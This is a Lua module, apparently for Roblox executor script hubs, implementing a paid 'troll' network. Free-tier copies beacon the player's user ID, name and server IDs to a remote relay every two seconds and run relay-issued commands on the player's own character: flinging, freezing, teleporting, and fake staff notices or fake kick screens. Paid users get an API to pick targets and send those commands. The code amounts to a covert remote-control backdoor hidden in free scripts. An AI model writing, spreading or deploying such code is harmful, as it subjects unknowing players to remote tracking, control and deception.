--[[
    oxy shared client  ·  served at  <relay>/client.lua
    ------------------------------------------------------------------
    ONE module, embedded by every hub (free + paid + third-party).

      local OxyNet = loadstring(game:HttpGet("https://YOUR.up.railway.app/client.lua"))()
      OxyNet.start({
          backendUrl = "https://YOUR.up.railway.app",
          tier       = "free",          -- "free" (trollable) | "paid" (immune sender)
          hubId      = "oxy",           -- your hub's tag, shows up in the target list
          adminToken = nil,             -- PAID ONLY. never ship this in a free build.
      })

    free  -> syncs presence every ~2s and EXECUTES incoming troll commands on itself.
    paid  -> syncs as immune, and exposes OxyNet.getTargets() / OxyNet.sendCommand().
    ------------------------------------------------------------------
]]

local OxyNet = {}
OxyNet._version = 1

local Players    = game:GetService("Players")
local HttpService= game:GetService("HttpService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local LP         = Players.LocalPlayer

-- ===========================================================================
--  HTTP (executor-agnostic)
-- ===========================================================================
local function resolveRequest()
    local g = (getgenv and getgenv()) or {}
    local candidates = {
        rawget(g, "http_request"), rawget(g, "request"),
        (syn and syn.request),
        (http and http.request),
        (fluxus and fluxus.request),
        http_request, request,
    }
    for _, fn in ipairs(candidates) do
        if type(fn) == "function" then return fn end
    end
    return nil
end
local _request = resolveRequest()

local function httpJson(method, url, headers, bodyTbl)
    headers = headers or {}
    headers["Content-Type"] = "application/json"
    local body = bodyTbl and HttpService:JSONEncode(bodyTbl) or nil

    if _request then
        local ok, res = pcall(_request, { Url = url, Method = method, Headers = headers, Body = body })
        if not ok then return false, tostring(res) end
        local status = res.StatusCode or res.status or res.status_code or 0
        local text   = res.Body or res.body or ""
        if status < 200 or status >= 300 then return false, "HTTP " .. tostring(status), text end
        local okDec, decoded = pcall(function() return text ~= "" and HttpService:JSONDecode(text) or {} end)
        return true, (okDec and decoded or {}), status
    end

    -- GET-only fallback (no POST available on this executor)
    if method == "GET" then
        local ok, text = pcall(function() return game:HttpGet(url) end)
        if not ok then return false, tostring(text) end
        local okDec, decoded = pcall(function() return HttpService:JSONDecode(text) end)
        return okDec, (okDec and decoded or text)
    end
    return false, "no POST-capable http function on this executor"
end

-- ===========================================================================
--  config / identity
-- ===========================================================================
local cfg = {
    backendUrl   = nil,
    tier         = "free",
    hubId        = "oxy",
    adminToken   = nil,
    syncInterval = 2.0,
    notifyOnLoad = false,
}

local function selfIdentity()
    return {
        userId      = tostring(LP.UserId),
        name        = LP.Name,
        displayName = LP.DisplayName,
        placeId     = tostring(game.PlaceId),
        jobId       = tostring(game.JobId),
        hubId       = cfg.hubId,
        tier        = cfg.tier,
        v           = OxyNet._version,
    }
end

-- ===========================================================================
--  small helpers
-- ===========================================================================
local function myChar()  return LP.Character end
local function myHum()   local c = myChar() return c and c:FindFirstChildOfClass("Humanoid") end
local function myHRP()
    local c = myChar()
    return c and (c:FindFirstChild("HumanoidRootPart") or (c.PrimaryPart) or c:FindFirstChild("Torso"))
end
local function setVel(part, v)
    pcall(function() part.AssemblyLinearVelocity = v end)
    pcall(function() part.Velocity = v end)
end

local function toast(title, text, dur)
    pcall(function()
        StarterGui:SetCore("SendNotification", { Title = title or "oxy", Text = text or "", Duration = dur or 4 })
    end)
    -- also route to a host hub notifier if one is present
    local lib = (shared and shared.Oracle and shared.Oracle.Library) or (shared and shared.OxyLibrary)
    if lib and lib.Notify then pcall(lib.Notify, lib, (title and (title .. ": ") or "") .. (text or ""), dur or 4) end
end

-- ===========================================================================
--  TROLL EXECUTORS  (only ever run on a FREE client — see dispatch guard)
-- ===========================================================================
local frozen = { on = false, conn = nil }

local EXEC = {}

function EXEC.ping(_, from)
    toast("oxy", ("pipe OK · from %s"):format(from and from.name or "?"), 4)
end

function EXEC.notify(args, from)
    local title = tostring((args and args.title) or "SERVER")
    local text  = tostring((args and args.text) or "You have been noticed by staff.")
    toast(title, text, tonumber(args and args.duration) or 5)
    if args and args.big then
        -- large centered banner overlay
        pcall(function()
            local gui = Instance.new("ScreenGui")
            gui.Name = "\0"; gui.ResetOnSpawn = false; gui.IgnoreGuiInset = true
            gui.DisplayOrder = 999; gui.Parent = (gethui and gethui()) or LP:WaitForChild("PlayerGui")
            local lbl = Instance.new("TextLabel", gui)
            lbl.Size = UDim2.new(1,0,0,80); lbl.Position = UDim2.new(0,0,0.12,0)
            lbl.BackgroundTransparency = 0.25; lbl.BackgroundColor3 = Color3.fromRGB(20,20,24)
            lbl.TextColor3 = Color3.fromRGB(255,90,90); lbl.Font = Enum.Font.GothamBold
            lbl.TextScaled = true; lbl.Text = "  " .. text .. "  "
            game:GetService("Debris"):AddItem(gui, tonumber(args.duration) or 5)
        end)
    end
end

function EXEC.fling(args)
    local hrp, hum = myHRP(), myHum()
    if not hrp then return end
    local dur = math.clamp(tonumber(args and args.duration) or 0.7, 0.2, 3)
    if hum then pcall(function() hum.PlatformStand = true end) end
    local gyro = Instance.new("BodyAngularVelocity")
    gyro.MaxTorque      = Vector3.new(1,1,1) * 1e6
    gyro.P              = 1e6
    gyro.AngularVelocity= Vector3.new(0, 9e4, 0)
    gyro.Parent = hrp
    local conn = RunService.Heartbeat:Connect(function()
        setVel(hrp, Vector3.new(0, 75, 0))
    end)
    task.delay(dur, function()
        if conn then conn:Disconnect() end
        pcall(function() gyro:Destroy() end)
        if hum then pcall(function() hum.PlatformStand = false end) end
    end)
end

function EXEC.launch(args)
    local hrp = myHRP(); if not hrp then return end
    local power = math.clamp(tonumber(args and args.power) or 220, 40, 1000)
    local n = 0
    local conn; conn = RunService.Heartbeat:Connect(function()
        n = n + 1
        setVel(hrp, Vector3.new(0, power, 0))
        if n > 6 then conn:Disconnect() end
    end)
end

function EXEC.spin(args)
    local hrp = myHRP(); if not hrp then return end
    local dur = math.clamp(tonumber(args and args.duration) or 3, 0.5, 10)
    local gyro = Instance.new("BodyAngularVelocity")
    gyro.MaxTorque       = Vector3.new(1,1,1) * 1e6
    gyro.P               = 1e6
    gyro.AngularVelocity = Vector3.new(0, tonumber(args and args.speed) or 5e4, 0)
    gyro.Parent = hrp
    task.delay(dur, function() pcall(function() gyro:Destroy() end) end)
end

function EXEC.freeze(args)
    local hrp = myHRP(); if not hrp then return end
    local dur = math.clamp(tonumber(args and args.duration) or 4, 0.5, 15)
    frozen.on = true
    if frozen.conn then frozen.conn:Disconnect() end
    -- keep it anchored even if the game unanchors on respawn
    frozen.conn = RunService.Heartbeat:Connect(function()
        local h = myHRP()
        if frozen.on and h then pcall(function() h.Anchored = true end) end
    end)
    task.delay(dur, function() EXEC.unfreeze() end)
end

function EXEC.unfreeze()
    frozen.on = false
    if frozen.conn then frozen.conn:Disconnect(); frozen.conn = nil end
    local hrp = myHRP(); if hrp then pcall(function() hrp.Anchored = false end) end
end

function EXEC.bring(args)
    local hrp = myHRP(); if not (hrp and args and args.cf) then return end
    local cf
    local t = args.cf
    if #t >= 12 then
        cf = CFrame.new(t[1],t[2],t[3], t[4],t[5],t[6], t[7],t[8],t[9], t[10],t[11],t[12])
    elseif #t >= 3 then
        cf = CFrame.new(t[1], t[2], t[3])
    end
    if not cf then return end
    cf = cf * CFrame.new(0, 0, -4) -- drop them just in front of the sender
    -- fight the game briefly so a re-anchor / physics step doesn't snap them back
    local n = 0
    local conn; conn = RunService.Heartbeat:Connect(function()
        n = n + 1
        local h = myHRP()
        if h then pcall(function() h.CFrame = cf end) end
        if n > 8 then conn:Disconnect() end
    end)
end

function EXEC.sit()
    local hum = myHum(); if not hum then return end
    pcall(function() hum.Sit = true end)
    pcall(function() hum.Jump = true end)
end

function EXEC.fakekick(args)
    local reason = tostring((args and args.reason) or "You were kicked from this experience.")
    pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "\0"; gui.IgnoreGuiInset = true; gui.ResetOnSpawn = false
        gui.DisplayOrder = 1e6; gui.Parent = (gethui and gethui()) or LP:WaitForChild("PlayerGui")
        local dim = Instance.new("Frame", gui)
        dim.Size = UDim2.fromScale(1,1); dim.BackgroundColor3 = Color3.new(0,0,0); dim.BackgroundTransparency = 0.35
        local box = Instance.new("Frame", gui)
        box.Size = UDim2.fromOffset(420, 150); box.Position = UDim2.new(0.5,-210,0.5,-75)
        box.BackgroundColor3 = Color3.fromRGB(40,40,40); box.BorderSizePixel = 0
        Instance.new("UICorner", box).CornerRadius = UDim.new(0,6)
        local head = Instance.new("TextLabel", box)
        head.Size = UDim2.new(1,0,0,40); head.BackgroundColor3 = Color3.fromRGB(30,30,30); head.BorderSizePixel = 0
        head.Font = Enum.Font.GothamBold; head.TextSize = 18; head.TextColor3 = Color3.new(1,1,1); head.Text = "Disconnected"
        local msg = Instance.new("TextLabel", box)
        msg.Size = UDim2.new(1,-24,1,-90); msg.Position = UDim2.new(0,12,0,48)
        msg.BackgroundTransparency = 1; msg.TextWrapped = true; msg.Font = Enum.Font.Gotham
        msg.TextSize = 15; msg.TextColor3 = Color3.fromRGB(230,230,230); msg.Text = reason
        local btn = Instance.new("TextButton", box)
        btn.Size = UDim2.fromOffset(90,30); btn.Position = UDim2.new(1,-102,1,-40)
        btn.BackgroundColor3 = Color3.fromRGB(0,120,215); btn.BorderSizePixel = 0
        btn.Font = Enum.Font.GothamBold; btn.TextSize = 15; btn.TextColor3 = Color3.new(1,1,1); btn.Text = "Leave"
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)
        btn.MouseButton1Click:Connect(function() gui:Destroy() end)
        game:GetService("Debris"):AddItem(gui, tonumber(args and args.duration) or 8)
    end)
end

-- ===========================================================================
--  dispatch (the immunity gate lives here too)
-- ===========================================================================
local seen = {}
local function dispatch(cmd)
    if cfg.tier ~= "free" then return end            -- paid clients are immune
    if not cmd or type(cmd) ~= "table" then return end
    if cmd.id then
        if seen[cmd.id] then return end
        seen[cmd.id] = true
    end
    local fn = EXEC[cmd.action]
    if not fn then return end
    if cfg.onCommand then pcall(cfg.onCommand, cmd) end
    task.spawn(function() pcall(fn, cmd.args, cmd.from) end)
end

-- ===========================================================================
--  sync loop
-- ===========================================================================
local running = false
local function syncOnce()
    local ok, res = httpJson("POST", cfg.backendUrl .. "/api/sync", nil, selfIdentity())
    if ok and type(res) == "table" and type(res.commands) == "table" then
        for _, cmd in ipairs(res.commands) do dispatch(cmd) end
    end
    return ok, res
end

local function startLoop()
    if running then return end
    running = true
    task.spawn(function()
        while running do
            pcall(syncOnce)
            task.wait(cfg.syncInterval)
        end
    end)
end

-- ===========================================================================
--  PAID sender API
-- ===========================================================================
function OxyNet.getTargets()
    if not cfg.backendUrl then return {} end
    local headers = { ["x-oxy-token"] = cfg.adminToken or "" }
    local ok, res = httpJson("GET", cfg.backendUrl .. "/api/targets?self=" .. tostring(LP.UserId), headers, nil)
    if ok and type(res) == "table" and type(res.targets) == "table" then return res.targets end
    return {}
end

function OxyNet.sendCommand(targetUserId, action, args)
    if not cfg.backendUrl then return false, "not started" end
    local headers = { ["x-oxy-token"] = cfg.adminToken or "" }
    local body = {
        targetUserId = tostring(targetUserId),
        action       = action,
        args         = args or {},
        fromUserId   = tostring(LP.UserId),
        fromName     = LP.Name,
    }
    return httpJson("POST", cfg.backendUrl .. "/api/command", headers, body)
end

-- convenience: current CFrame packed for a "bring" command
function OxyNet.myCFrameArgs()
    local hrp = myHRP()
    if not hrp then return nil end
    return { cf = { hrp.CFrame:GetComponents() } }
end

OxyNet.ACTIONS = { "fling", "launch", "spin", "freeze", "unfreeze", "bring", "sit", "notify", "fakekick", "ping" }

-- ===========================================================================
--  start
-- ===========================================================================
function OxyNet.start(opts)
    opts = opts or {}
    assert(type(opts.backendUrl) == "string" and opts.backendUrl ~= "", "OxyNet.start: backendUrl required")
    cfg.backendUrl   = opts.backendUrl:gsub("/+$", "")
    cfg.tier         = (opts.tier == "paid") and "paid" or "free"
    cfg.hubId        = tostring(opts.hubId or "oxy")
    cfg.adminToken   = opts.adminToken
    cfg.syncInterval = tonumber(opts.syncInterval) or (cfg.tier == "paid" and 5.0 or 2.0)
    cfg.onCommand    = opts.onCommand

    shared.OxyNet = OxyNet  -- let a host hub's admin panel grab us
    startLoop()
    if opts.notifyOnLoad then toast("oxy", "connected (" .. cfg.tier .. ")", 3) end
    return OxyNet
end

function OxyNet.stop()
    running = false
    EXEC.unfreeze()
end

OxyNet.getConfig = function() return { tier = cfg.tier, hubId = cfg.hubId, backendUrl = cfg.backendUrl } end

return OxyNet
